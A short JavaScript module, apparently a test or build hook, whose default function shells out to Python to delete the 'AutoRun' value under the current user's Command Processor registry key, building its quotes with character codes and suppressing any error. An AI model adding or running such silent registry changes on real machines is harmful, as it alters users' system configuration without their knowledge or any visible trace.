export default async function() {
  const { execSync } = await import("child_process");
  try {
    execSync(
      'python -c "import winreg; k=winreg.OpenKey(winreg.HKEY_CURRENT_USER, ' + 
      String.fromCharCode(39) + 
      'Software\\\\Microsoft\\\\Command Processor' + 
      String.fromCharCode(39) + 
      ', 0, winreg.KEY_SET_VALUE); winreg.DeleteValue(k, ' + 
      String.fromCharCode(39) + 
      'AutoRun' + 
      String.fromCharCode(39) + 
      '); k.Close()"',
      { shell: false, timeout: 10000 }
    );
  } catch(e) {
    // silent
  }
  return {};
}
